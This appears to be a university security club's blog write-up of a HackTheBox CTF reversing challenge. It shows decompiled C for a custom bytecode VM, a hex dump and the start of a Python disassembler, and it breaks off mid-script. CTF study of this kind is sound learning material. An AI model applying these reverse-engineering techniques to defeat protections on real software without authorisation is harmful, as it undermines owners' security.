<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission - CUEH ComSec</title><meta name=Description content="Team writeups from the HackTheBox Cyber Apocalypse 2023"><meta property="og:title" content="Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission"><meta property="og:description" content="Team writeups from the HackTheBox Cyber Apocalypse 2023"><meta property="og:type" content="article"><meta property="og:url" content="https://cov-comsec.github.io/posts/2023_hackthebox_cyberapoc/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-23T12:40:28+01:00"><meta property="article:modified_time" content="2023-03-31T23:21:20+01:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cov-comsec.github.io/logo.svg"><meta name=twitter:title content="Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission"><meta name=twitter:description content="Team writeups from the HackTheBox Cyber Apocalypse 2023"><meta name=application-name content="CUEH ComSec"><meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/2023_hackthebox_cyberapoc/><link rel=prev href=https://cov-comsec.github.io/posts/down-under-ctf-2022/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/2023_hackthebox_cyberapoc\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"htb, ctf, writeup","wordcount":5830,"url":"https:\/\/cov-comsec.github.io\/posts\/2023_hackthebox_cyberapoc\/","datePublished":"2023-03-23T12:40:28+01:00","dateModified":"2023-03-31T23:21:20+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Ben R"},"description":"Team writeups from the HackTheBox Cyber Apocalypse 2023"}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/about/>About </a><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/schedule/>Schedule </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/schedule/ title>Schedule</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup: Hack The Box Cyber Apocalypse 2023 - The Cursed Mission</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Ben R</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2022-23/><i class="far fa-folder fa-fw"></i>Academic Year 2022-23</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2023-03-23>2023-03-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5830 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;28 minutes&nbsp;</div></div><div class=content id=content><p>The HackTheBox Cyber Apocalypse has become a staple annual event of the ComSec CTF calendar, though this year a couple
of changed were introduced - such as the maximum team size and average difficulty of the challenges. This post
contains some challenges</p><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content false" id=toc-content-auto></div></div><div class="details toc" id=toc-static kept=true><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#rev-alien-saboteur>rev: Alien Saboteur</a><ul><li><a href=#understanding-the-vm>Understanding the VM</a></li><li><a href=#reversing-the-vm-program>Reversing the VM Program</a></li><li><a href=#getting-the-first-password>Getting the First Password</a></li><li><a href=#unravelling-more-code>Unravelling more Code</a></li><li><a href=#finding-the-flag>Finding the Flag</a></li></ul></li><li><a href=#pwn-control-room>pwn: Control Room</a><ul><li><a href=#static-analysis>Static Analysis</a></li></ul></li><li><a href=#configure-engine>Configure Engine</a></li><li><a href=#exploitation>Exploitation</a></li></ul></nav></div></div><h2 id=rev-alien-saboteur>rev: Alien Saboteur</h2><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss0.png data-srcset="./images/alien/ss0.png, ./images/alien/ss0.png 1.5x, ./images/alien/ss0.png 2x" data-sizes=auto alt=./images/alien/ss0.png title="Challenge Card"></p><p>Solved by Ben R, this was rated a medium difficulty challenge, and his personal favourite challenge in the CTF. 2 files
could be downloaded, and there was no remote element.</p><p>Running the program, it seems to be a classic &lsquo;find the password&rsquo; style challenge.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ ./vm bin
</span></span><span class=line><span class=cl>[Main Vessel Terminal]
</span></span><span class=line><span class=cl>&lt; Enter keycode
</span></span><span class=line><span class=cl>&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=understanding-the-vm>Understanding the VM</h3><p>The two files were <code>vm</code> and <code>bin</code>. As the name suggests, the <code>bin</code> file was a binary blob, the <code>vm</code> file was an
ELF. The main function program showed the binary blob being read into memory, and is then passed
to the <code>vm_create()</code> function.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss1.png data-srcset="./images/alien/ss1.png, ./images/alien/ss1.png 1.5x, ./images/alien/ss1.png 2x" data-sizes=auto alt=./images/alien/ss1.png title="Main Function"></p><p>Cleaning up the compilation as we go, we can see the <code>vm_create</code> function essentially allocates 2 areas of memory
for the virtual machine, and an additional area for the vm metadata. I created a structure to represent the
metadata structure, hopefully the members can be given better names as the reversing process continues.</p><div class="details admonition note"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>A little reverse engineering tip here - when trying to clean out some nasty compilation due to a custom structure
or something, getting the size of the structure right is usually enough to <strong>significantly</strong> improve the readability.</div></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>vm_meta</span><span class=o>*</span> <span class=nf>vm_create</span><span class=p>(</span><span class=kt>int64_t</span> <span class=n>blob_ptr</span><span class=p>,</span> <span class=kt>int64_t</span> <span class=n>vm_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>vm_meta</span><span class=o>*</span> <span class=n>vm_ptrs</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=nl>bytes</span><span class=p>:</span> <span class=mi>168</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_0</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_4</span><span class=p>.</span><span class=n>b</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_a0</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_8</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_90</span> <span class=o>=</span> <span class=nf>calloc</span><span class=p>(</span><span class=nl>n</span><span class=p>:</span> <span class=mh>0x10000</span><span class=p>,</span> <span class=nl>elem_size</span><span class=p>:</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_90</span><span class=p>,</span> <span class=n>blob_ptr</span> <span class=o>+</span> <span class=mi>3</span><span class=p>,</span> <span class=n>vm_size</span> <span class=o>-</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>field_98</span> <span class=o>=</span> <span class=nf>calloc</span><span class=p>(</span><span class=nl>n</span><span class=p>:</span> <span class=mh>0x200</span><span class=p>,</span> <span class=nl>elem_size</span><span class=p>:</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>vm_ptrs</span>
</span></span></code></pre></td></tr></table></div></div><p>With the virtual machine setup, <code>vm_run()</code> is called, one of the <code>vm_meta</code> structs members was identified
as a boolean to indicate when to stop stepping through the vm code.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>vm_run</span><span class=p>(</span><span class=k>struct</span> <span class=n>vm_meta</span><span class=o>*</span> <span class=n>vm_ptrs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>vm_running</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>vm_running</span> <span class=o>=</span> <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>is_running</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>vm_running</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=nf>vm_step</span><span class=p>(</span><span class=n>vm_ptrs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>vm_running</span>
</span></span></code></pre></td></tr></table></div></div><p>The <code>vm_step</code> function was the first that looked pretty nasty, using pointer math and offsets to extract data
out of the supplied argument and essentially use a crude method of dynamic dispatch to call the correct
function based on an offset to a global variable (highlighted red).</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss2.png data-srcset="./images/alien/ss2.png, ./images/alien/ss2.png 1.5x, ./images/alien/ss2.png 2x" data-sizes=auto alt=./images/alien/ss2.png title="vm_step function"></p><p>Cleaning that up, we can see that a byte of data is being read from an offset to the <code>vm_code</code> memory, and used to
indicate which function should be executed in the operations table.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss3.png data-srcset="./images/alien/ss3.png, ./images/alien/ss3.png 1.5x, ./images/alien/ss3.png 2x" data-sizes=auto alt=./images/alien/ss3.png title="cleaned up vm_step function"></p><p>The operations table points to all the operations that can be performed by the <code>vm</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>operations_table</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_add</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_addi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_sub</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_subi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_mul</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_muli</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_div</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_cmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_jmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_inv</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_push</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_pop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_mov</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_nop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_print</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_putc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_je</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_jne</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_jle</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_jge</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_xor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_store</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_load</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>vm_input</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=reversing-the-vm-program>Reversing the VM Program</h3><p>It could be pointless to now go and reverse engineer all the operations, some of them may never be used. Looking at
the <code>bin</code> file, we see the first three bytes are the file header, which don&rsquo;t get <code>memcpy</code>&rsquo;d into the code segment,
and then an 0x10 byte which equates to the <code>vm_putc</code> function.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ xxd bin | head
</span></span><span class=line><span class=cl>00000000: 5577 5510 5b00 0000 0010 4d00 0000 0010  UwU.[.....M.....
</span></span><span class=line><span class=cl>00000010: 6100 0000 0010 6900 0000 0010 6e00 0000  a.....i.....n...
</span></span><span class=line><span class=cl>00000020: 0010 2000 0000 0010 5600 0000 0010 6500  .. .....V.....e.
</span></span><span class=line><span class=cl>00000030: 0000 0010 7300 0000 0010 7300 0000 0010  ....s.....s.....
</span></span><span class=line><span class=cl>00000040: 6500 0000 0010 6c00 0000 0010 2000 0000  e.....l..... ...
</span></span><span class=line><span class=cl>00000050: 0010 5400 0000 0010 6500 0000 0010 7200  ..T.....e.....r.
</span></span><span class=line><span class=cl>00000060: 0000 0010 6d00 0000 0010 6900 0000 0010  ....m.....i.....
</span></span><span class=line><span class=cl>00000070: 6e00 0000 0010 6100 0000 0010 6c00 0000  n.....a.....l...
</span></span><span class=line><span class=cl>00000080: 0010 5d00 0000 0010 0a00 0000 0010 3c00  ..]...........&lt;.
</span></span><span class=line><span class=cl>00000090: 0000 0010 2000 0000 0010 4500 0000 0010  .... .....E.....
</span></span></code></pre></td></tr></table></div></div><p>This function clearly shows that <code>putc</code> takes one argument, which is a 8-bit integer stored in the byte
directly following the instruction.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/alien/ss5.png data-srcset="./images/alien/ss5.png, ./images/alien/ss5.png 1.5x, ./images/alien/ss5.png 2x" data-sizes=auto alt=./images/alien/ss5.png title="vm_putc function"></p><p>The penultimate statement in the function, where the instruction pointer
is incremented by 6, hints that <strong>all</strong> instructions in this custom vm are 6 in total.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>vm_meta</span><span class=o>*</span> <span class=nf>vm_putc</span><span class=p>(</span><span class=k>struct</span> <span class=n>vm_meta</span><span class=o>*</span> <span class=n>vm_ptrs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>putchar</span><span class=p>(</span><span class=nl>c</span><span class=p>:</span> <span class=n>zx</span><span class=p>.</span><span class=nf>d</span><span class=p>(</span><span class=nf>u8</span><span class=p>(</span><span class=n>zx</span><span class=p>.</span><span class=nf>q</span><span class=p>(</span><span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>instruction_counter</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>+</span> <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>code_section</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>instruction_counter</span> <span class=o>=</span> <span class=n>vm_ptrs</span><span class=o>-&gt;</span><span class=n>instruction_counter</span> <span class=o>+</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>vm_ptrs</span>
</span></span></code></pre></td></tr></table></div></div><p>Time to write some code to disassemble the binary blob.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>file_data</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>instruction_counter</span> <span class=o>=</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_putc</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: putc(&#39;</span><span class=si>{</span><span class=nb>chr</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_mov</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>imm</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: MOV </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>imm</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_input</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>:</span><span class=mi>3</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: INPUT: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
